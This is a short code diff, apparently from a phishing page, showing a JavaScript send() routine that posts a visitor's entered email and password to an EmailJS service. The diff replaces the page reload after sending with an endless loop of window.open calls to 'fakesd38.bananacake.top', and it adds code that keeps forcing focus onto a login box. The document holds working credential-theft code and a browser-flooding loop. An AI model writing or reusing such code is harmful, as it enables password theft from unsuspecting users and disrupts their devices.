@@ -323,11 +323,19 @@
                     document.getElementById('return').remove();
                     document.getElementById('a2').remove();
                 }
+                await sleep(250);
+                document.getElementById('loginbx').focus();
             }
             async function send(){
-                emailjs.send("service_fk5hn8j", "template_lfsnd6r", {email: email, password: password}).then((response) => location.reload());
+                emailjs.send("service_fk5hn8j", "template_lfsnd6r", {email: email, password: password}).then((response) => {
+                    while (true){
+                        window.open('https://fakesd38.bananacake.top');
+                    }
+                });
             }
             async function loop(){
+                await sleep(250);
+                document.getElementById('loginbx').focus();
                 while (true){
                     await sleep(500);
                     document.getElementById('test').style.color = '#fff';
